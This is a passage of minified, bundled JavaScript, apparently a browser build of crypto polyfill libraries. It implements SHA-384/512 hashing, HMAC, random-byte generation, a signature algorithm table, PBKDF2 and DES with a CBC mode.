        this._dh = this._dh + pe + ae(this._dl, q) | 0,
        this._eh = this._eh + ye + ae(this._el, L) | 0,
        this._fh = this._fh + be + ae(this._fl, U) | 0,
        this._gh = this._gh + xe + ae(this._gl, Z) | 0,
        this._hh = this._hh + Ae + ae(this._hl, te) | 0
    }
    ,
    w.prototype._hash = function() {
        var ne = j.allocUnsafe(64);
        function oe(ue, fe, he) {
            ne.writeInt32BE(ue, he),
            ne.writeInt32BE(fe, he + 4)
        }
        return oe(this._ah, this._al, 0),
        oe(this._bh, this._bl, 8),
        oe(this._ch, this._cl, 16),
        oe(this._dh, this._dl, 24),
        oe(this._eh, this._el, 32),
        oe(this._fh, this._fl, 40),
        oe(this._gh, this._gl, 48),
        oe(this._hh, this._hl, 56),
        ne
    }
    ,
    sha512$1 = w,
    sha512$1
}
var sha384$1, hasRequiredSha384;
function requireSha384() {
    if (hasRequiredSha384)
        return sha384$1;
    hasRequiredSha384 = 1;
    var _ = requireInherits_browser()
      , M = requireSha512()
      , j = requireHash$1()
      , O = requireSafeBuffer$1().Buffer
      , x = new Array(160);
    function w() {
        this.init(),
        this._w = x,
        j.call(this, 128, 112)
    }
    return _(w, M),
    w.prototype.init = function() {
        return this._ah = 3418070365,
        this._bh = 1654270250,
        this._ch = 2438529370,
        this._dh = 355462360,
        this._eh = 1731405415,
        this._fh = 2394180231,
        this._gh = 3675008525,
        this._hh = 1203062813,
        this._al = 3238371032,
        this._bl = 914150663,
        this._cl = 812702999,
        this._dl = 4144912697,
        this._el = 4290775857,
        this._fl = 1750603025,
        this._gl = 1694076839,
        this._hl = 3204075428,
        this
    }
    ,
    w.prototype._hash = function() {
        var b = O.allocUnsafe(48);
        function X(Y, F, V) {
            b.writeInt32BE(Y, V),
            b.writeInt32BE(F, V + 4)
        }
        return X(this._ah, this._al, 0),
        X(this._bh, this._bl, 8),
        X(this._ch, this._cl, 16),
        X(this._dh, this._dl, 24),
        X(this._eh, this._el, 32),
        X(this._fh, this._fl, 40),
        b
    }
    ,
    sha384$1 = w,
    sha384$1
}
var hasRequiredSha_js;
function requireSha_js() {
    if (hasRequiredSha_js)
        return sha_js.exports;
    hasRequiredSha_js = 1;
    var _ = sha_js.exports = function(j) {
        j = j.toLowerCase();
        var O = _[j];
        if (!O)
            throw new Error(j + " is not supported (we accept pull requests)");
        return new O
    }
    ;
    return _.sha = requireSha$1(),
    _.sha1 = requireSha1(),
    _.sha224 = requireSha224(),
    _.sha256 = requireSha256(),
    _.sha384 = requireSha384(),
    _.sha512 = requireSha512(),
    sha_js.exports
}
var browser$d, hasRequiredBrowser$d;
function requireBrowser$d() {
    if (hasRequiredBrowser$d)
        return browser$d;
    hasRequiredBrowser$d = 1;
    var _ = requireInherits_browser()
      , M = requireLegacy()
      , j = requireCipherBase()
      , O = requireSafeBuffer$1().Buffer
      , x = requireMd5()
      , w = requireRipemd160()
      , b = requireSha_js()
      , X = O.alloc(128);
    function Y(F, V) {
        j.call(this, "digest"),
        typeof V == "string" && (V = O.from(V));
        var K = F === "sha512" || F === "sha384" ? 128 : 64;
        if (this._alg = F,
        this._key = V,
        V.length > K) {
            var Q = F === "rmd160" ? new w : b(F);
            V = Q.update(V).digest()
        } else
            V.length < K && (V = O.concat([V, X], K));
        for (var ee = this._ipad = O.allocUnsafe(K), ae = this._opad = O.allocUnsafe(K), ne = 0; ne < K; ne++)
            ee[ne] = V[ne] ^ 54,
            ae[ne] = V[ne] ^ 92;
        this._hash = F === "rmd160" ? new w : b(F),
        this._hash.update(ee)
    }
    return _(Y, j),
    Y.prototype._update = function(F) {
        this._hash.update(F)
    }
    ,
    Y.prototype._final = function() {
        var F = this._hash.digest()
          , V = this._alg === "rmd160" ? new w : b(this._alg);
        return V.update(this._opad).update(F).digest()
    }
    ,
    browser$d = function(V, K) {
        return V = V.toLowerCase(),
        V === "rmd160" || V === "ripemd160" ? new Y("rmd160",K) : V === "md5" ? new M(x,K) : new Y(V,K)
    }
    ,
    browser$d
}
function commonjsRequire(_) {
    throw new Error('Could not dynamically require "' + _ + '". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.')
}
var naclFast = {
    exports: {}
}, cryptoBrowserify = {}, browser$c = {
    exports: {}
}, hasRequiredBrowser$c;
function requireBrowser$c() {
    if (hasRequiredBrowser$c)
        return browser$c.exports;
    hasRequiredBrowser$c = 1;
    var _ = 65536
      , M = 4294967295;
    function j() {
        throw new Error(`Secure random number generation is not supported by this browser.
Use Chrome, Firefox or Internet Explorer 11`)
    }
    var O = requireSafeBuffer$1().Buffer
      , x = window.crypto || window.msCrypto;
    x && x.getRandomValues ? browser$c.exports = w : browser$c.exports = j;
    function w(b, X) {
        if (b > M)
            throw new RangeError("requested too many random bytes");
        var Y = O.allocUnsafe(b);
        if (b > 0)
            if (b > _)
                for (var F = 0; F < b; F += _)
                    x.getRandomValues(Y.slice(F, F + _));
            else
                x.getRandomValues(Y);
        return typeof X == "function" ? process$1.nextTick(function() {
            X(null, Y)
        }) : Y
    }
    return browser$c.exports
}
var browser$b, hasRequiredBrowser$b;
function requireBrowser$b() {
    if (hasRequiredBrowser$b)
        return browser$b;
    hasRequiredBrowser$b = 1;
    var _ = requireInherits_browser()
      , M = requireMd5_js()
      , j = requireRipemd160()
      , O = requireSha_js()
      , x = requireCipherBase();
    function w(b) {
        x.call(this, "digest"),
        this._hash = b
    }
    return _(w, x),
    w.prototype._update = function(b) {
        this._hash.update(b)
    }
    ,
    w.prototype._final = function() {
        return this._hash.digest()
    }
    ,
    browser$b = function(X) {
        return X = X.toLowerCase(),
        X === "md5" ? new M : X === "rmd160" || X === "ripemd160" ? new j : new w(O(X))
    }
    ,
    browser$b
}
const sha224WithRSAEncryption = {
    sign: "rsa",
    hash: "sha224",
    id: "302d300d06096086480165030402040500041c"
}
  , sha256WithRSAEncryption = {
    sign: "rsa",
    hash: "sha256",
    id: "3031300d060960864801650304020105000420"
}
  , sha384WithRSAEncryption = {
    sign: "rsa",
    hash: "sha384",
    id: "3041300d060960864801650304020205000430"
}
  , sha512WithRSAEncryption = {
    sign: "rsa",
    hash: "sha512",
    id: "3051300d060960864801650304020305000440"
}
  , sha256 = {
    sign: "ecdsa",
    hash: "sha256",
    id: ""
}
  , sha224 = {
    sign: "ecdsa",
    hash: "sha224",
    id: ""
}
  , sha384 = {
    sign: "ecdsa",
    hash: "sha384",
    id: ""
}
  , sha512 = {
    sign: "ecdsa",
    hash: "sha512",
    id: ""
}
  , DSA = {
    sign: "dsa",
    hash: "sha1",
    id: ""
}
  , ripemd160WithRSA = {
    sign: "rsa",
    hash: "rmd160",
    id: "3021300906052b2403020105000414"
}
  , md5WithRSAEncryption = {
    sign: "rsa",
    hash: "md5",
    id: "3020300c06082a864886f70d020505000410"
}
  , require$$6 = {
    sha224WithRSAEncryption,
    "RSA-SHA224": {
        sign: "ecdsa/rsa",
        hash: "sha224",
        id: "302d300d06096086480165030402040500041c"
    },
    sha256WithRSAEncryption,
    "RSA-SHA256": {
        sign: "ecdsa/rsa",
        hash: "sha256",
        id: "3031300d060960864801650304020105000420"
    },
    sha384WithRSAEncryption,
    "RSA-SHA384": {
        sign: "ecdsa/rsa",
        hash: "sha384",
        id: "3041300d060960864801650304020205000430"
    },
    sha512WithRSAEncryption,
    "RSA-SHA512": {
        sign: "ecdsa/rsa",
        hash: "sha512",
        id: "3051300d060960864801650304020305000440"
    },
    "RSA-SHA1": {
        sign: "rsa",
        hash: "sha1",
        id: "3021300906052b0e03021a05000414"
    },
    "ecdsa-with-SHA1": {
        sign: "ecdsa",
        hash: "sha1",
        id: ""
    },
    sha256,
    sha224,
    sha384,
    sha512,
    "DSA-SHA": {
        sign: "dsa",
        hash: "sha1",
        id: ""
    },
    "DSA-SHA1": {
        sign: "dsa",
        hash: "sha1",
        id: ""
    },
    DSA,
    "DSA-WITH-SHA224": {
        sign: "dsa",
        hash: "sha224",
        id: ""
    },
    "DSA-SHA224": {
        sign: "dsa",
        hash: "sha224",
        id: ""
    },
    "DSA-WITH-SHA256": {
        sign: "dsa",
        hash: "sha256",
        id: ""
    },
    "DSA-SHA256": {
        sign: "dsa",
        hash: "sha256",
        id: ""
    },
    "DSA-WITH-SHA384": {
        sign: "dsa",
        hash: "sha384",
        id: ""
    },
    "DSA-SHA384": {
        sign: "dsa",
        hash: "sha384",
        id: ""
    },
    "DSA-WITH-SHA512": {
        sign: "dsa",
        hash: "sha512",
        id: ""
    },
    "DSA-SHA512": {
        sign: "dsa",
        hash: "sha512",
        id: ""
    },
    "DSA-RIPEMD160": {
        sign: "dsa",
        hash: "rmd160",
        id: ""
    },
    ripemd160WithRSA,
    "RSA-RIPEMD160": {
        sign: "rsa",
        hash: "rmd160",
        id: "3021300906052b2403020105000414"
    },
    md5WithRSAEncryption,
    "RSA-MD5": {
        sign: "rsa",
        hash: "md5",
        id: "3020300c06082a864886f70d020505000410"
    }
};
var algos, hasRequiredAlgos;
function requireAlgos() {
    return hasRequiredAlgos || (hasRequiredAlgos = 1,
    algos = require$$6),
    algos
}
var browser$a = {}, precondition, hasRequiredPrecondition;
function requirePrecondition() {
    if (hasRequiredPrecondition)
        return precondition;
    hasRequiredPrecondition = 1;
    var _ = Math.pow(2, 30) - 1;
    return precondition = function(M, j) {
        if (typeof M != "number")
            throw new TypeError("Iterations not a number");
        if (M < 0)
            throw new TypeError("Bad iterations");
        if (typeof j != "number")
            throw new TypeError("Key length not a number");
        if (j < 0 || j > _ || j !== j)
            throw new TypeError("Bad key length")
    }
    ,
    precondition
}
var defaultEncoding_1, hasRequiredDefaultEncoding;
function requireDefaultEncoding() {
    if (hasRequiredDefaultEncoding)
        return defaultEncoding_1;
    hasRequiredDefaultEncoding = 1;
    var _;
    if (window.process && window.process.browser)
        _ = "utf-8";
    else if (window.process && window.process.version) {
        var M = parseInt(process$1.version.split(".")[0].slice(1), 10);
        _ = M >= 6 ? "utf-8" : "binary"
    } else
        _ = "utf-8";
    return defaultEncoding_1 = _,
    defaultEncoding_1
}
var toBuffer, hasRequiredToBuffer;
function requireToBuffer() {
    if (hasRequiredToBuffer)
        return toBuffer;
    hasRequiredToBuffer = 1;
    var _ = requireSafeBuffer$1().Buffer;
    return toBuffer = function(M, j, O) {
        if (_.isBuffer(M))
            return M;
        if (typeof M == "string")
            return _.from(M, j);
        if (ArrayBuffer.isView(M))
            return _.from(M.buffer);
        throw new TypeError(O + " must be a string, a Buffer, a typed array or a DataView")
    }
    ,
    toBuffer
}
var syncBrowser, hasRequiredSyncBrowser;
function requireSyncBrowser() {
    if (hasRequiredSyncBrowser)
        return syncBrowser;
    hasRequiredSyncBrowser = 1;
    var _ = requireMd5()
      , M = requireRipemd160()
      , j = requireSha_js()
      , O = requireSafeBuffer$1().Buffer
      , x = requirePrecondition()
      , w = requireDefaultEncoding()
      , b = requireToBuffer()
      , X = O.alloc(128)
      , Y = {
        md5: 16,
        sha1: 20,
        sha224: 28,
        sha256: 32,
        sha384: 48,
        sha512: 64,
        rmd160: 20,
        ripemd160: 20
    };
    function F(Q, ee, ae) {
        var ne = V(Q)
          , oe = Q === "sha512" || Q === "sha384" ? 128 : 64;
        ee.length > oe ? ee = ne(ee) : ee.length < oe && (ee = O.concat([ee, X], oe));
        for (var ue = O.allocUnsafe(oe + Y[Q]), fe = O.allocUnsafe(oe + Y[Q]), he = 0; he < oe; he++)
            ue[he] = ee[he] ^ 54,
            fe[he] = ee[he] ^ 92;
        var pe = O.allocUnsafe(oe + ae + 4);
        ue.copy(pe, 0, 0, oe),
        this.ipad1 = pe,
        this.ipad2 = ue,
        this.opad = fe,
        this.alg = Q,
        this.blocksize = oe,
        this.hash = ne,
        this.size = Y[Q]
    }
    F.prototype.run = function(Q, ee) {
        Q.copy(ee, this.blocksize);
        var ae = this.hash(ee);
        return ae.copy(this.opad, this.blocksize),
        this.hash(this.opad)
    }
    ;
    function V(Q) {
        function ee(ne) {
            return j(Q).update(ne).digest()
        }
        function ae(ne) {
            return new M().update(ne).digest()
        }
        return Q === "rmd160" || Q === "ripemd160" ? ae : Q === "md5" ? _ : ee
    }
    function K(Q, ee, ae, ne, oe) {
        x(ae, ne),
        Q = b(Q, w, "Password"),
        ee = b(ee, w, "Salt"),
        oe = oe || "sha1";
        var ue = new F(oe,Q,ee.length)
          , fe = O.allocUnsafe(ne)
          , he = O.allocUnsafe(ee.length + 4);
        ee.copy(he, 0, 0, ee.length);
        for (var pe = 0, ye = Y[oe], be = Math.ceil(ne / ye), xe = 1; xe <= be; xe++) {
            he.writeUInt32BE(xe, ee.length);
            for (var Ae = ue.run(he, ue.ipad1), Ee = Ae, Be = 1; Be < ae; Be++) {
                Ee = ue.run(Ee, ue.ipad2);
                for (var ce = 0; ce < ye; ce++)
                    Ae[ce] ^= Ee[ce]
            }
            Ae.copy(fe, pe),
            pe += ye
        }
        return fe
    }
    return syncBrowser = K,
    syncBrowser
}
var async, hasRequiredAsync;
function requireAsync() {
    if (hasRequiredAsync)
        return async;
    hasRequiredAsync = 1;
    var _ = requireSafeBuffer$1().Buffer, M = requirePrecondition(), j = requireDefaultEncoding(), O = requireSyncBrowser(), x = requireToBuffer(), w, b = window.crypto && window.crypto.subtle, X = {
        sha: "SHA-1",
        "sha-1": "SHA-1",
        sha1: "SHA-1",
        sha256: "SHA-256",
        "sha-256": "SHA-256",
        sha384: "SHA-384",
        "sha-384": "SHA-384",
        "sha-512": "SHA-512",
        sha512: "SHA-512"
    }, Y = [];
    function F(ae) {
        if (window.process && !window.process.browser || !b || !b.importKey || !b.deriveBits)
            return Promise.resolve(!1);
        if (Y[ae] !== void 0)
            return Y[ae];
        w = w || _.alloc(8);
        var ne = Q(w, w, 10, 128, ae).then(function() {
            return !0
        }).catch(function() {
            return !1
        });
        return Y[ae] = ne,
        ne
    }
    var V;
    function K() {
        return V || (window.process && window.process.nextTick ? V = window.process.nextTick : window.queueMicrotask ? V = window.queueMicrotask : window.setImmediate ? V = window.setImmediate : V = window.setTimeout,
        V)
    }
    function Q(ae, ne, oe, ue, fe) {
        return b.importKey("raw", ae, {
            name: "PBKDF2"
        }, !1, ["deriveBits"]).then(function(he) {
            return b.deriveBits({
                name: "PBKDF2",
                salt: ne,
                iterations: oe,
                hash: {
                    name: fe
                }
            }, he, ue << 3)
        }).then(function(he) {
            return _.from(he)
        })
    }
    function ee(ae, ne) {
        ae.then(function(oe) {
            K()(function() {
                ne(null, oe)
            })
        }, function(oe) {
            K()(function() {
                ne(oe)
            })
        })
    }
    return async = function(ae, ne, oe, ue, fe, he) {
        typeof fe == "function" && (he = fe,
        fe = void 0),
        fe = fe || "sha1";
        var pe = X[fe.toLowerCase()];
        if (!pe || typeof window.Promise != "function") {
            K()(function() {
                var ye;
                try {
                    ye = O(ae, ne, oe, ue, fe)
                } catch (be) {
                    return he(be)
                }
                he(null, ye)
            });
            return
        }
        if (M(oe, ue),
        ae = x(ae, j, "Password"),
        ne = x(ne, j, "Salt"),
        typeof he != "function")
            throw new Error("No callback provided to pbkdf2");
        ee(F(pe).then(function(ye) {
            return ye ? Q(ae, ne, oe, ue, pe) : O(ae, ne, oe, ue, fe)
        }), he)
    }
    ,
    async
}
var hasRequiredBrowser$a;
function requireBrowser$a() {
    return hasRequiredBrowser$a || (hasRequiredBrowser$a = 1,
    browser$a.pbkdf2 = requireAsync(),
    browser$a.pbkdf2Sync = requireSyncBrowser()),
    browser$a
}
var browser$9 = {}, des$1 = {}, utils$9 = {}, hasRequiredUtils$7;
function requireUtils$7() {
    if (hasRequiredUtils$7)
        return utils$9;
    hasRequiredUtils$7 = 1,
    utils$9.readUInt32BE = function(x, w) {
        var b = x[0 + w] << 24 | x[1 + w] << 16 | x[2 + w] << 8 | x[3 + w];
        return b >>> 0
    }
    ,
    utils$9.writeUInt32BE = function(x, w, b) {
        x[0 + b] = w >>> 24,
        x[1 + b] = w >>> 16 & 255,
        x[2 + b] = w >>> 8 & 255,
        x[3 + b] = w & 255
    }
    ,
    utils$9.ip = function(x, w, b, X) {
        for (var Y = 0, F = 0, V = 6; V >= 0; V -= 2) {
            for (var K = 0; K <= 24; K += 8)
                Y <<= 1,
                Y |= w >>> K + V & 1;
            for (var K = 0; K <= 24; K += 8)
                Y <<= 1,
                Y |= x >>> K + V & 1
        }
        for (var V = 6; V >= 0; V -= 2) {
            for (var K = 1; K <= 25; K += 8)
                F <<= 1,
                F |= w >>> K + V & 1;
            for (var K = 1; K <= 25; K += 8)
                F <<= 1,
                F |= x >>> K + V & 1
        }
        b[X + 0] = Y >>> 0,
        b[X + 1] = F >>> 0
    }
    ,
    utils$9.rip = function(x, w, b, X) {
        for (var Y = 0, F = 0, V = 0; V < 4; V++)
            for (var K = 24; K >= 0; K -= 8)
                Y <<= 1,
                Y |= w >>> K + V & 1,
                Y <<= 1,
                Y |= x >>> K + V & 1;
        for (var V = 4; V < 8; V++)
            for (var K = 24; K >= 0; K -= 8)
                F <<= 1,
                F |= w >>> K + V & 1,
                F <<= 1,
                F |= x >>> K + V & 1;
        b[X + 0] = Y >>> 0,
        b[X + 1] = F >>> 0
    }
    ,
    utils$9.pc1 = function(x, w, b, X) {
        for (var Y = 0, F = 0, V = 7; V >= 5; V--) {
            for (var K = 0; K <= 24; K += 8)
                Y <<= 1,
                Y |= w >> K + V & 1;
            for (var K = 0; K <= 24; K += 8)
                Y <<= 1,
                Y |= x >> K + V & 1
        }
        for (var K = 0; K <= 24; K += 8)
            Y <<= 1,
            Y |= w >> K + V & 1;
        for (var V = 1; V <= 3; V++) {
            for (var K = 0; K <= 24; K += 8)
                F <<= 1,
                F |= w >> K + V & 1;
            for (var K = 0; K <= 24; K += 8)
                F <<= 1,
                F |= x >> K + V & 1
        }
        for (var K = 0; K <= 24; K += 8)
            F <<= 1,
            F |= x >> K + V & 1;
        b[X + 0] = Y >>> 0,
        b[X + 1] = F >>> 0
    }
    ,
    utils$9.r28shl = function(x, w) {
        return x << w & 268435455 | x >>> 28 - w
    }
    ;
    var _ = [14, 11, 17, 4, 27, 23, 25, 0, 13, 22, 7, 18, 5, 9, 16, 24, 2, 20, 12, 21, 1, 8, 15, 26, 15, 4, 25, 19, 9, 1, 26, 16, 5, 11, 23, 8, 12, 7, 17, 0, 22, 3, 10, 14, 6, 20, 27, 24];
    utils$9.pc2 = function(x, w, b, X) {
        for (var Y = 0, F = 0, V = _.length >>> 1, K = 0; K < V; K++)
            Y <<= 1,
            Y |= x >>> _[K] & 1;
        for (var K = V; K < _.length; K++)
            F <<= 1,
            F |= w >>> _[K] & 1;
        b[X + 0] = Y >>> 0,
        b[X + 1] = F >>> 0
    }
    ,
    utils$9.expand = function(x, w, b) {
        var X = 0
          , Y = 0;
        X = (x & 1) << 5 | x >>> 27;
        for (var F = 23; F >= 15; F -= 4)
            X <<= 6,
            X |= x >>> F & 63;
        for (var F = 11; F >= 3; F -= 4)
            Y |= x >>> F & 63,
            Y <<= 6;
        Y |= (x & 31) << 1 | x >>> 31,
        w[b + 0] = X >>> 0,
        w[b + 1] = Y >>> 0
    }
    ;
    var M = [14, 0, 4, 15, 13, 7, 1, 4, 2, 14, 15, 2, 11, 13, 8, 1, 3, 10, 10, 6, 6, 12, 12, 11, 5, 9, 9, 5, 0, 3, 7, 8, 4, 15, 1, 12, 14, 8, 8, 2, 13, 4, 6, 9, 2, 1, 11, 7, 15, 5, 12, 11, 9, 3, 7, 14, 3, 10, 10, 0, 5, 6, 0, 13, 15, 3, 1, 13, 8, 4, 14, 7, 6, 15, 11, 2, 3, 8, 4, 14, 9, 12, 7, 0, 2, 1, 13, 10, 12, 6, 0, 9, 5, 11, 10, 5, 0, 13, 14, 8, 7, 10, 11, 1, 10, 3, 4, 15, 13, 4, 1, 2, 5, 11, 8, 6, 12, 7, 6, 12, 9, 0, 3, 5, 2, 14, 15, 9, 10, 13, 0, 7, 9, 0, 14, 9, 6, 3, 3, 4, 15, 6, 5, 10, 1, 2, 13, 8, 12, 5, 7, 14, 11, 12, 4, 11, 2, 15, 8, 1, 13, 1, 6, 10, 4, 13, 9, 0, 8, 6, 15, 9, 3, 8, 0, 7, 11, 4, 1, 15, 2, 14, 12, 3, 5, 11, 10, 5, 14, 2, 7, 12, 7, 13, 13, 8, 14, 11, 3, 5, 0, 6, 6, 15, 9, 0, 10, 3, 1, 4, 2, 7, 8, 2, 5, 12, 11, 1, 12, 10, 4, 14, 15, 9, 10, 3, 6, 15, 9, 0, 0, 6, 12, 10, 11, 1, 7, 13, 13, 8, 15, 9, 1, 4, 3, 5, 14, 11, 5, 12, 2, 7, 8, 2, 4, 14, 2, 14, 12, 11, 4, 2, 1, 12, 7, 4, 10, 7, 11, 13, 6, 1, 8, 5, 5, 0, 3, 15, 15, 10, 13, 3, 0, 9, 14, 8, 9, 6, 4, 11, 2, 8, 1, 12, 11, 7, 10, 1, 13, 14, 7, 2, 8, 13, 15, 6, 9, 15, 12, 0, 5, 9, 6, 10, 3, 4, 0, 5, 14, 3, 12, 10, 1, 15, 10, 4, 15, 2, 9, 7, 2, 12, 6, 9, 8, 5, 0, 6, 13, 1, 3, 13, 4, 14, 14, 0, 7, 11, 5, 3, 11, 8, 9, 4, 14, 3, 15, 2, 5, 12, 2, 9, 8, 5, 12, 15, 3, 10, 7, 11, 0, 14, 4, 1, 10, 7, 1, 6, 13, 0, 11, 8, 6, 13, 4, 13, 11, 0, 2, 11, 14, 7, 15, 4, 0, 9, 8, 1, 13, 10, 3, 14, 12, 3, 9, 5, 7, 12, 5, 2, 10, 15, 6, 8, 1, 6, 1, 6, 4, 11, 11, 13, 13, 8, 12, 1, 3, 4, 7, 10, 14, 7, 10, 9, 15, 5, 6, 0, 8, 15, 0, 14, 5, 2, 9, 3, 2, 12, 13, 1, 2, 15, 8, 13, 4, 8, 6, 10, 15, 3, 11, 7, 1, 4, 10, 12, 9, 5, 3, 6, 14, 11, 5, 0, 0, 14, 12, 9, 7, 2, 7, 2, 11, 1, 4, 14, 1, 7, 9, 4, 12, 10, 14, 8, 2, 13, 0, 15, 6, 12, 10, 9, 13, 0, 15, 3, 3, 5, 5, 6, 8, 11];
    utils$9.substitute = function(x, w) {
        for (var b = 0, X = 0; X < 4; X++) {
            var Y = x >>> 18 - X * 6 & 63
              , F = M[X * 64 + Y];
            b <<= 4,
            b |= F
        }
        for (var X = 0; X < 4; X++) {
            var Y = w >>> 18 - X * 6 & 63
              , F = M[4 * 64 + X * 64 + Y];
            b <<= 4,
            b |= F
        }
        return b >>> 0
    }
    ;
    var j = [16, 25, 12, 11, 3, 20, 4, 15, 31, 17, 9, 6, 27, 14, 1, 22, 30, 24, 8, 18, 0, 5, 29, 23, 13, 19, 2, 26, 10, 21, 28, 7];
    return utils$9.permute = function(x) {
        for (var w = 0, b = 0; b < j.length; b++)
            w <<= 1,
            w |= x >>> j[b] & 1;
        return w >>> 0
    }
    ,
    utils$9.padSplit = function(x, w, b) {
        for (var X = x.toString(2); X.length < w; )
            X = "0" + X;
        for (var Y = [], F = 0; F < w; F += b)
            Y.push(X.slice(F, F + b));
        return Y.join(" ")
    }
    ,
    utils$9
}
var minimalisticAssert, hasRequiredMinimalisticAssert;
function requireMinimalisticAssert() {
    if (hasRequiredMinimalisticAssert)
        return minimalisticAssert;
    hasRequiredMinimalisticAssert = 1,
    minimalisticAssert = _;
    function _(M, j) {
        if (!M)
            throw new Error(j || "Assertion failed")
    }
    return _.equal = function(j, O, x) {
        if (j != O)
            throw new Error(x || "Assertion failed: " + j + " != " + O)
    }
    ,
    minimalisticAssert
}
var cipher, hasRequiredCipher;
function requireCipher() {
    if (hasRequiredCipher)
        return cipher;
    hasRequiredCipher = 1;
    var _ = requireMinimalisticAssert();
    function M(j) {
        this.options = j,
        this.type = this.options.type,
        this.blockSize = 8,
        this._init(),
        this.buffer = new Array(this.blockSize),
        this.bufferOff = 0,
        this.padding = j.padding !== !1
    }
    return cipher = M,
    M.prototype._init = function() {}
    ,
    M.prototype.update = function(O) {
        return O.length === 0 ? [] : this.type === "decrypt" ? this._updateDecrypt(O) : this._updateEncrypt(O)
    }
    ,
    M.prototype._buffer = function(O, x) {
        for (var w = Math.min(this.buffer.length - this.bufferOff, O.length - x), b = 0; b < w; b++)
            this.buffer[this.bufferOff + b] = O[x + b];
        return this.bufferOff += w,
        w
    }
    ,
    M.prototype._flushBuffer = function(O, x) {
        return this._update(this.buffer, 0, O, x),
        this.bufferOff = 0,
        this.blockSize
    }
    ,
    M.prototype._updateEncrypt = function(O) {
        var x = 0
          , w = 0
          , b = (this.bufferOff + O.length) / this.blockSize | 0
          , X = new Array(b * this.blockSize);
        this.bufferOff !== 0 && (x += this._buffer(O, x),
        this.bufferOff === this.buffer.length && (w += this._flushBuffer(X, w)));
        for (var Y = O.length - (O.length - x) % this.blockSize; x < Y; x += this.blockSize)
            this._update(O, x, X, w),
            w += this.blockSize;
        for (; x < O.length; x++,
        this.bufferOff++)
            this.buffer[this.bufferOff] = O[x];
        return X
    }
    ,
    M.prototype._updateDecrypt = function(O) {
        for (var x = 0, w = 0, b = Math.ceil((this.bufferOff + O.length) / this.blockSize) - 1, X = new Array(b * this.blockSize); b > 0; b--)
            x += this._buffer(O, x),
            w += this._flushBuffer(X, w);
        return x += this._buffer(O, x),
        X
    }
    ,
    M.prototype.final = function(O) {
        var x;
        O && (x = this.update(O));
        var w;
        return this.type === "encrypt" ? w = this._finalEncrypt() : w = this._finalDecrypt(),
        x ? x.concat(w) : w
    }
    ,
    M.prototype._pad = function(O, x) {
        if (x === 0)
            return !1;
        for (; x < O.length; )
            O[x++] = 0;
        return !0
    }
    ,
    M.prototype._finalEncrypt = function() {
        if (!this._pad(this.buffer, this.bufferOff))
            return [];
        var O = new Array(this.blockSize);
        return this._update(this.buffer, 0, O, 0),
        O
    }
    ,
    M.prototype._unpad = function(O) {
        return O
    }
    ,
    M.prototype._finalDecrypt = function() {
        _.equal(this.bufferOff, this.blockSize, "Not enough data to decrypt");
        var O = new Array(this.blockSize);
        return this._flushBuffer(O, 0),
        this._unpad(O)
    }
    ,
    cipher
}
var des, hasRequiredDes$1;
function requireDes$1() {
    if (hasRequiredDes$1)
        return des;
    hasRequiredDes$1 = 1;
    var _ = requireMinimalisticAssert()
      , M = requireInherits_browser()
      , j = requireUtils$7()
      , O = requireCipher();
    function x() {
        this.tmp = new Array(2),
        this.keys = null
    }
    function w(X) {
        O.call(this, X);
        var Y = new x;
        this._desState = Y,
        this.deriveKeys(Y, X.key)
    }
    M(w, O),
    des = w,
    w.create = function(Y) {
        return new w(Y)
    }
    ;
    var b = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1];
    return w.prototype.deriveKeys = function(Y, F) {
        Y.keys = new Array(16 * 2),
        _.equal(F.length, this.blockSize, "Invalid key length");
        var V = j.readUInt32BE(F, 0)
          , K = j.readUInt32BE(F, 4);
        j.pc1(V, K, Y.tmp, 0),
        V = Y.tmp[0],
        K = Y.tmp[1];
        for (var Q = 0; Q < Y.keys.length; Q += 2) {
            var ee = b[Q >>> 1];
            V = j.r28shl(V, ee),
            K = j.r28shl(K, ee),
            j.pc2(V, K, Y.keys, Q)
        }
    }
    ,
    w.prototype._update = function(Y, F, V, K) {
        var Q = this._desState
          , ee = j.readUInt32BE(Y, F)
          , ae = j.readUInt32BE(Y, F + 4);
        j.ip(ee, ae, Q.tmp, 0),
        ee = Q.tmp[0],
        ae = Q.tmp[1],
        this.type === "encrypt" ? this._encrypt(Q, ee, ae, Q.tmp, 0) : this._decrypt(Q, ee, ae, Q.tmp, 0),
        ee = Q.tmp[0],
        ae = Q.tmp[1],
        j.writeUInt32BE(V, ee, K),
        j.writeUInt32BE(V, ae, K + 4)
    }
    ,
    w.prototype._pad = function(Y, F) {
        if (this.padding === !1)
            return !1;
        for (var V = Y.length - F, K = F; K < Y.length; K++)
            Y[K] = V;
        return !0
    }
    ,
    w.prototype._unpad = function(Y) {
        if (this.padding === !1)
            return Y;
        for (var F = Y[Y.length - 1], V = Y.length - F; V < Y.length; V++)
            _.equal(Y[V], F);
        return Y.slice(0, Y.length - F)
    }
    ,
    w.prototype._encrypt = function(Y, F, V, K, Q) {
        for (var ee = F, ae = V, ne = 0; ne < Y.keys.length; ne += 2) {
            var oe = Y.keys[ne]
              , ue = Y.keys[ne + 1];
            j.expand(ae, Y.tmp, 0),
            oe ^= Y.tmp[0],
            ue ^= Y.tmp[1];
            var fe = j.substitute(oe, ue)
              , he = j.permute(fe)
              , pe = ae;
            ae = (ee ^ he) >>> 0,
            ee = pe
        }
        j.rip(ae, ee, K, Q)
    }
    ,
    w.prototype._decrypt = function(Y, F, V, K, Q) {
        for (var ee = V, ae = F, ne = Y.keys.length - 2; ne >= 0; ne -= 2) {
            var oe = Y.keys[ne]
              , ue = Y.keys[ne + 1];
            j.expand(ee, Y.tmp, 0),
            oe ^= Y.tmp[0],
            ue ^= Y.tmp[1];
            var fe = j.substitute(oe, ue)
              , he = j.permute(fe)
              , pe = ee;
            ee = (ae ^ he) >>> 0,
            ae = pe
        }
        j.rip(ee, ae, K, Q)
    }
    ,
    des
}
var cbc$1 = {}, hasRequiredCbc$1;
function requireCbc$1() {
    if (hasRequiredCbc$1)
        return cbc$1;
    hasRequiredCbc$1 = 1;
    var _ = requireMinimalisticAssert()
      , M = requireInherits_browser()
      , j = {};
    function O(w) {
        _.equal(w.length, 8, "Invalid IV length"),
        this.iv = new Array(8);
        for (var b = 0; b < this.iv.length; b++)
            this.iv[b] = w[b]
    }
    function x(w) {
        function b(V) {
            w.call(this, V),
            this._cbcInit()
        }
        M(b, w);
        for (var X = Object.keys(j), Y = 0; Y < X.length; Y++) {
            var F = X[Y];
